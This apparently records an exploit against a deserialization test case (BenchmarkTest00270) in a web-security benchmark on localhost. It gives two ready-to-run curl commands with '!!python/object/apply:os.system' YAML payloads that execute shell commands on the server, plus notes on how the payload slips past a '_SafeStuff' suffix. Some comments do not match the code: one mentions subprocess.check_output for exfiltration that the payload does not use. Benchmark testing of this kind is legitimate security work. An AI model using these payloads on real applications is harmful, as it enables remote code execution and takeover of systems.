# RCE via YAML Insecure Deserialization
# The _SafeStuff suffix is bypassed by using a YAML mapping where:
# - The dangerous tag (as mapping key) gets evaluated, executing the command
# - _SafeStuff becomes the value of the 'text' key, making valid YAML

# Command execution (os.system):
curl -X POST 'https://localhost:8443/benchmark/deserialization-00/BenchmarkTest00270' \
  -d 'BenchmarkTest00270=!!python/object/apply:os.system ["touch /tmp/exploit_confirmed"]: ignored
text: ' -k

# Command with output capture (using subprocess.check_output to exfiltrate):
curl -X POST 'https://localhost:8443/benchmark/deserialization-00/BenchmarkTest00270' \
  -d 'BenchmarkTest00270=!!python/object/apply:os.system ["id > /tmp/id_out"]: ignored
text: ' -k

# Key elements:
# 1. Route: POST /benchmark/deserialization-00/BenchmarkTest00270
# 2. Parameter name: BenchmarkTest00270 (from request.form.getlist)
# 3. The %0a (newline) in the form value makes _SafeStuff appear on its own line
# 4. The YAML mapping absorbs _SafeStuff as the value for key 'text'